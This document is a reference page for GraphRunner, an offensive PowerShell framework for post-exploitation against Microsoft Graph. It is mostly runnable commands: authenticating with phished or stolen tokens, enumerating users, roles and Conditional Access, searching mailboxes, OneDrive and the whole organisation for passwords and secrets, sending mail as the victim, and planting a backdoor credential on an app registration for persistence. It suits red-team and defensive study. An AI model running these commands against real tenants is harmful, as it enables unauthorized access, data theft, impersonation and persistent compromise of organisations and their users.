# GraphRunner — Microsoft Graph API Post-Exploitation

PowerShell-based post-exploitation framework for Microsoft Graph API. Designed for red team operations — enumerates users, groups, apps, mail, SharePoint, Teams, and OneDrive through a single OAuth 2.0 token against `graph.microsoft.com`.

## How It Works

GraphRunner uses an acquired Microsoft Graph API token (from device code phishing, token theft, ROADtx, or AADInternals) to invoke Graph API endpoints through PowerShell. All operations go through `graph.microsoft.com/v1.0` or `/beta`.

**Auth methods:**
- Device code flow (interactive or automated)
- Refresh token
- Raw access token (from Mimikatz, ROADtx, AADInternals, or cookie theft)
- Client credentials (app-only)

**Capability modules:**

| Module | Area | Operations |
|--------|------|-----------|
| **User** | Recon | List users, attributes, roles, manager/direct reports, sign-in activity, MFA status |
| **Group** | Recon | List groups, members, transitive members, nested groups, role-assignable groups |
| **Mail** | Data | Read/send email, search mailboxes, access mailbox folder structures |
| **SharePoint** | Data | List SharePoint sites, drive contents, file download/upload/search |
| **OneDrive** | Data | List OneDrive files, download documents, search across drives |
| **Teams** | Data | Enumerate teams, channels, messages, files, meetings |
| **App** | Recon & Persistence | List app registrations, service principals, add credentials to apps |
| **Device** | Recon | List Intune-enrolled devices, BitLocker keys |
| **Auth** | Token | Test token validity, list sessions, Conditional Access evaluation |
| **CA** | Recon | Export Conditional Access policies, named locations |
| **PIM** | Recon | List Privileged Identity Management roles, eligible/active assignments |
| **Substrate** | Data | Access Microsoft Substrate (org-wide search across mail/OneDrive/SharePoint) |

**Key features:**
- Built-in token caching and refresh
- Output formatting (table, list, JSON, CSV)
- Results pipable between functions
- Conditional Access evaluation before each API call

## Manual

### Setup

```powershell
# Download GraphRunner.ps1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1 -OutFile GraphRunner.ps1

# Import
Import-Module .\GraphRunner.ps1
```

### Authentication

```powershell
# Device code flow (interactive)
$token = Get-GraphToken -DeviceCode

# Device code with specific client ID
$token = Get-GraphToken -DeviceCode -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"

# Refresh token
$token = Get-GraphToken -RefreshToken $refreshToken

# Raw access token
$token = Get-GraphToken -AccessToken $rawToken

# Client credentials (app-only)
$token = Get-GraphToken -ClientId <guid> -ClientSecret <secret> -TenantId <guid>
```

### User Reconnaissance

```powershell
# All users
Invoke-GraphRequest -Token $token -Url "users" -FormatTable

# Get specific user details
Invoke-GraphRequest -Token $token -Url "users/jdoe@domain.com" | Format-List

# Users with high-risk sign-ins
Invoke-GraphRequest -Token $token -Url "identityProtection/riskyUsers"

# Sign-in logs (last 30 days)
Invoke-GraphRequest -Token $token -Url "auditLogs/signIns" -Top 100

# Privileged role members
Invoke-GraphRequest -Token $token -Url "directoryRoles" -FormatTable
```

### Mail Operations

```powershell
# List inbox folders
Invoke-GraphRequest -Token $token -Url "me/mailFolders/Inbox/messages" -Top 10

# Search mailbox
Invoke-GraphRequest -Token $token -Url "me/messages?\$search=password" -Top 20

# Send email as user
Invoke-GraphRequest -Token $token -Url "me/sendMail" -Method POST -Body $emailBody
```

### SharePoint / OneDrive

```powershell
# List SharePoint sites
Invoke-GraphRequest -Token $token -Url "sites" -FormatTable

# List files in root of a site
Invoke-GraphRequest -Token $token -Url "sites/<site-id>/drive/root/children"

# Search across OneDrive
Invoke-GraphRequest -Token $token -Url "me/drive/root/search(q='password')"
```

### Teams

```powershell
# List joined teams
Invoke-GraphRequest -Token $token -Url "me/joinedTeams"

# List channels in a team
Invoke-GraphRequest -Token $token -Url "teams/<team-id>/channels"

# Get messages from channel
Invoke-GraphRequest -Token $token -Url "teams/<team-id>/channels/<channel-id>/messages" -Top 20
```

### Application Persistence

```powershell
# List apps
Invoke-GraphRequest -Token $token -Url "applications" -FormatTable

# Add password credential to an app
$body = @{
  passwordCredential = @{
    displayName = "BackdoorKey2024"
  }
} | ConvertTo-Json
Invoke-GraphRequest -Token $token -Url "applications/<app-id>/addPassword" -Method POST -Body $body
```

### Organization-wide Search (Substrate)

```powershell
# Search across all user mailboxes, OneDrive, and SharePoint
Invoke-GraphRequest -Token $token -Url "search/query" -Method POST -Body '{"requests":[{"entityTypes":["message","driveItem"],"query":{"queryString":"password OR credentials OR secret"}}]}'
```

### Conditional Access

```powershell
# List CA policies
Invoke-GraphRequest -Token $token -Url "identity/conditionalAccess/policies" -FormatTable

# Named locations
Invoke-GraphRequest -Token $token -Url "identity/conditionalAccess/namedLocations"
```

## Build / Install

```powershell
# Download single-file script
Invoke-WebRequest -Uri https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1 -OutFile GraphRunner.ps1

# No build required — PowerShell script
Import-Module .\GraphRunner.ps1
```

## Package

| Manager | Command |
|---------|---------|
| GitHub (raw) | https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1 |
| Direct download | `iwr -Uri https://github.com/dafthack/GraphRunner/raw/main/GraphRunner.ps1 -OutFile GraphRunner.ps1` |

## Links

| Resource | URL |
|----------|-----|
| GitHub | https://github.com/dafthack/GraphRunner |
| Dev blog | https://dafthack.com/ |
| GraphRunner intro | https://dafthack.com/graphrunner |
| Microsoft Graph docs | https://learn.microsoft.com/en-us/graph/api/overview |
| Graph Explorer | https://developer.microsoft.com/en-us/graph/graph-explorer |
